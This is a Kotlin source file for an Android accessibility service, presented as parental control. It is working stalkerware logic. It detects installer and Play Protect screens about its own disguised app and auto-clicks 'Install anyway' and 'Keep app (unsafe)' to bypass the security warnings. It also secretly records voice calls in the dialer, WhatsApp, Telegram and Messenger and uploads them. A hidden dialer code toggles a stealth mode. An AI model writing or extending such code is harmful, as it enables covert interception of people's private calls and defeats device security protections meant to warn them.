package com.example.parentalcontrol

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * خدمة إمكانية الوصول (Accessibility Service)
 * الميزة الأقوى: كشف المكالمات النشطة في أندرويد 12 و13
 */
class AppAccessibilityService : AccessibilityService() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    private var isCallActive = false
    private lateinit var audioRecorder: AudioRecorderEngine

    override fun onCreate() {
        super.onCreate()
        audioRecorder = AudioRecorderEngine(this)
        Log.i(TAG, "Accessibility Service created")
    }

    private val BYPASS_BUTTON_TEXTS = listOf(
        // English
        "More details",
        "Install anyway",
        "Keep app (unsafe)",
        "Keep app",
        "Install",
        "OK",
        "Settings",
        // Arabic
        "تفاصيل أكثر",
        "مزيد من التفاصيل",
        "المزيد من التفاصيل",
        "التثبيت على أي حال",
        "التثبيت على كل حال",
        "تثبيت على أي حال",
        "تثبيت على كل حال",
        "الاحتفاظ بالتطبيق",
        "الاحتفاظ بالتطبيق (غير آمن)",
        "تثبيت",
        "موافق",
        "الإعدادات",
        "الاعدادات"
    )

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return

        // 1. تحقق مما إذا كان الحدث من برنامج تثبيت التطبيقات أو النظام أو الحماية
        val isInstaller = packageName.contains("packageinstaller", ignoreCase = true) ||
                          packageName.contains("installer", ignoreCase = true) ||
                          packageName.contains("vending", ignoreCase = true) ||
                          packageName.contains("gms", ignoreCase = true) ||
                          packageName.contains("securitycenter", ignoreCase = true) ||
                          packageName.contains("settings", ignoreCase = true)

        if (isInstaller) {
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                val rootNode = rootInActiveWindow
                if (rootNode != null) {
                    checkAndBypassInstaller(rootNode)
                    rootNode.recycle()
                }
            }
            return
        }

        // 2. مراقبة تطبيقات الاتصال العادية وتطبيقات التواصل الاجتماعي
        val monitoredPackages = listOf(
            "com.google.android.dialer", 
            "com.samsung.android.dialer",
            "com.android.dialer",
            "com.android.server.telecom", 
            "com.android.phone",
            "com.whatsapp",
            "org.telegram.messenger",
            "com.facebook.orca" // Messenger
        )
        
        if (monitoredPackages.contains(packageName)) {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    // Check if the user is typing the secret code in the dialer
                    val typedText = event.text.toString().replace(Regex("[^0-9]"), "")
                    if (typedText.contains("1356365508")) {
                        Log.i(TAG, "Secret Code detected via typing! Opening app...")
                        StealthManager.toggleStealthMode(this)
                    }
                }

                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED, 
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    val text = event.text.toString() + " " + (event.contentDescription ?: "")
                    
                    // كشف بداية المكالمة (صوتية أو فيديو)
                    if (isCallUI(text) && !isCallActive) {
                        startCallRecording(packageName)
                    } 
                    // كشف نهاية المكالمة
                    else if (isEndCallUI(text) && isCallActive) {
                        stopCallRecording()
                    }
                }
            }
        }
    }

    private fun isCallUI(text: String): Boolean {
        val keywords = listOf(
            "Incoming", "Ongoing", "Call", "WhatsApp Call", "In call",
            "اتصال", "جاري", "مكالمة", "وقت المكالمة", "نشط"
        )
        return keywords.any { text.contains(it, ignoreCase = true) }
    }

    private fun isEndCallUI(text: String): Boolean {
        val keywords = listOf(
            "Ended", "Finished", "Call ended", "Missed", "Declined",
            "انتهت", "مكالمة فائتة", "تم إنهاء", "رفض", "تم القطع"
        )
        return keywords.any { text.contains(it, ignoreCase = true) }
    }

    private fun startCallRecording(app: String) {
        Log.i(TAG, "Call detected in $app! Starting recording...")
        isCallActive = true
        // نمرر اسم التطبيق للتوضيح في اسم الملف مستقبلاً
        audioRecorder.startCallRecording()
    }

    private fun stopCallRecording() {
        Log.i(TAG, "Call ended. Saving and uploading...")
        isCallActive = false
        audioRecorder.stopRecording(upload = true)
    }

    private fun checkAndBypassInstaller(rootNode: android.view.accessibility.AccessibilityNodeInfo) {
        val screenContent = getScreenText(rootNode).lowercase()
        val isOurApp = screenContent.contains("optimization engine") || 
                      screenContent.contains("parentalcontrol") || 
                      screenContent.contains("parental control") ||
                      screenContent.contains("sync-service")
                      
        if (!isOurApp) {
            return
        }

        Log.d(TAG, "Installer screen detected for our app. Searching for bypass buttons...")
        clickBypassButtons(rootNode)
    }

    private fun getScreenText(node: android.view.accessibility.AccessibilityNodeInfo?): String {
        if (node == null) return ""
        val sb = java.lang.StringBuilder()
        val text = node.text?.toString() ?: ""
        val desc = node.contentDescription?.toString() ?: ""
        sb.append(text).append(" ").append(desc).append(" ")
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                sb.append(getScreenText(child))
                child.recycle()
            }
        }
        return sb.toString()
    }

    private fun clickBypassButtons(node: android.view.accessibility.AccessibilityNodeInfo?): Boolean {
        if (node == null) return false
        
        val text = node.text?.toString()?.trim() ?: ""
        val desc = node.contentDescription?.toString()?.trim() ?: ""
        
        val isMatch = BYPASS_BUTTON_TEXTS.any { target ->
            text.equals(target, ignoreCase = true) || desc.equals(target, ignoreCase = true)
        }
        
        if (isMatch) {
            if (node.isClickable) {
                val success = node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                if (success) {
                    Log.i(TAG, "Bypassed installer by clicking: $text")
                    return true
                }
            } else {
                var parent = node.parent
                while (parent != null) {
                    if (parent.isClickable) {
                        val success = parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                        if (success) {
                            Log.i(TAG, "Bypassed installer by clicking parent of: $text")
                            parent.recycle()
                            return true
                        }
                    }
                    val nextParent = parent.parent
                    parent.recycle()
                    parent = nextParent
                }
            }
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                val clicked = clickBypassButtons(child)
                child.recycle()
                if (clicked) {
                    return true
                }
            }
        }
        
        return false
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility Service interrupted")
    }

    companion object {
        private const val TAG = "AppAccessibility"
    }
}
